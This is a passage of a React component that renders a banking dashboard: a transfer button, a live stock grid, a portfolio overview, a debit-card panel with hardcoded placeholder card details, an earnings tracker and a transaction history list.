                    handleSendMessage();
                  }
                }}
                disabled={interactionCount >= 2}
              />
              <div className="flex justify-end mt-2">
                <button 
                  onClick={handleSendMessage}
                  className="bg-yellow-500 hover:bg-yellow-600 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
                >
                  Send
                </button>
              </div>
            </div>
          </div>
        )}
      </div>

      <div className="relative z-10 pt-32 px-4 pb-8">
        <div className="max-w-7xl mx-auto">
          <div className="flex flex-col items-center mb-8">
            <div className="flex items-center mb-4 md:mt-10">
              <h1 className="text-2xl font-bold text-white ">Welcome back.</h1>
              
            </div>
            <div className="flex flex-col sm:flex-row gap-4">
              <button
                onClick={handleTransferMoneyClick}
                className="w-full sm:w-[200px] bg-yellow-500 hover:bg-opacity-80 text-black px-4 py-3 rounded-lg font-semibold transition-colors duration-300 shadow-md text-lg"
              >
                Transfer Money
              </button>
            </div>
          </div>

          {/* Live Stock Content */}
          <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md mb-8">
            <h2 className="text-xl font-semibold mb-4 text-yellow-500">Live Market</h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-5 gap-4">
              {stocks.map((stock, index) => (
                <div key={index} className="p-4 bg-white/5 rounded-lg">
                  <div className="flex justify-between items-center">
                    <span className="font-semibold text-white">{stock.symbol}</span>
                    <span className={`text-sm ${stock.change >= 0 ? 'text-green-500' : 'text-red-500'}`}>
                      {stock.change >= 0 ? '↑' : '↓'} {Math.abs(stock.changePercent)}%
                    </span>
                  </div>
                  <div className="mt-2">
                    <p className="text-lg font-semibold text-white">${stock.price}</p>
                    <p className={`text-sm ${stock.change >= 0 ? 'text-green-500' : 'text-red-500'}`}>
                      {stock.change >= 0 ? '+' : ''}{stock.change}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          </div>

  

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md">
              <h2 className="text-xl font-semibold mb-4 text-yellow-500">Portfolio Overview</h2>
              <div className="space-y-4">
                <div className="flex justify-between items-center">
                  <span className="text-gray-200">Total Balance</span>
                  <span className="text-2xl font-bold text-green-500">{totalBalance}</span>
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="p-4 bg-white/5 rounded-lg">
                    <span className="text-gray-200">Real Estate</span>
                    <p className="text-lg font-semibold text-green-500">$1,200,000</p>
                  </div>
                  <div className="p-4 bg-white/5 rounded-lg">
                    <span className="text-gray-200">Cryptocurrency</span>
                    <p className="text-lg font-semibold text-green-500">$800,000</p>
                  </div>
                  <div className="p-4 bg-white/5 rounded-lg">
                    <span className="text-gray-200">Stocks</span>
                    <p className="text-lg font-semibold text-green-500">$300,000</p>
                  </div>
                </div>
              </div>
            </div>
            <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md">
              <h2 className="text-xl font-semibold mb-4 text-yellow-500">Digital Debit Card</h2>
              <div className="p-4 bg-white/5 rounded-lg">
                <div className="flex justify-between items-center mb-4">
                  <span className="text-gray-200">Card Number</span>
                  <span className="text-white">
                    {showCardDetails ? formatCardNumber('3347832944752225') : '**** **** **** 2225'}
                  </span>
                </div>
                <div className="flex justify-between items-center mb-4">
                  <span className="text-gray-200">Expiry Date</span>
                  <span className="text-white">12/25</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-200">CVV</span>
                  <span className="text-white">{showCardDetails ? '522' : '***'}</span>
                </div>
                <button 
                  onClick={() => setShowCardDetails(!showCardDetails)}
                  className="w-full mt-4 bg-yellow-500 hover:bg-yellow-600 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
                >
                  {showCardDetails ? 'Hide Card Details' : 'View Card Details'}
                </button>
              </div>
            </div>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md">
              <h2 className="text-xl font-semibold mb-4 text-yellow-500">Earnings & Returns Tracker</h2>
              <div className="space-y-4">
                <div className="p-4 bg-white/5 rounded-lg">
                  <span className="text-gray-200">Total Earnings</span>
                  <p className="text-2xl font-bold text-green-500">$345,000</p>
                </div>
                <div className="p-4 bg-white/5 rounded-lg">
                  <span className="text-gray-200">Monthly Returns</span>
                  <p className="text-2xl font-bold text-green-500">+$28,750</p>
                </div>
                <div className="p-4 bg-white/5 rounded-lg">
                  <span className="text-gray-200">Weekly Returns</span>
                  <p className="text-2xl font-bold text-green-500">+$7,200</p>
                </div>
                <div className="p-4 bg-white/5 rounded-lg">
                  <span className="text-gray-200">Daily Returns</span>
                  <p className="text-2xl font-bold text-green-500">+$1,500</p>
                </div>
              </div>
            </div>
            <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg shadow-md">
              <h2 className="text-xl font-semibold mb-4 text-yellow-500">Transaction History</h2>
              <div className="space-y-4">
                {(showAllTransactions ? transactions : transactions.slice(0, 5)).map((transaction, index) => (
                  <div key={index} className="p-4 bg-white/5 rounded-lg">
                    <div className="flex justify-between items-center">
                      <div>
                        <span className="font-semibold text-white">{transaction.type}</span>
                        <p className="text-sm text-gray-300">{transaction.source}</p>
                      </div>
                      <span className={`text-lg font-semibold ${transaction.amount >= 0 ? 'text-green-500' : 'text-red-500'}`}>
                        {transaction.amount >= 0 ? '+' : ''}{transaction.amount.toLocaleString()}
                      </span>
                    </div>
                    <div className="flex justify-between items-center mt-2">
                      <span className="text-sm text-gray-200">{transaction.date}</span>
                      <span className="text-sm text-green-500">{transaction.status}</span>
                    </div>
                  </div>
                ))}
                <button
                  onClick={() => setShowAllTransactions(!showAllTransactions)}
                  className="w-full mt-4 bg-yellow-500 hover:bg-yellow-600 text-black px-4 py-2 rounded-lg font-semibold transition-colors duration-300"
                >
                  {showAllTransactions ? 'View Less Transactions' : 'View More Transactions'}
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </main>
  );
} 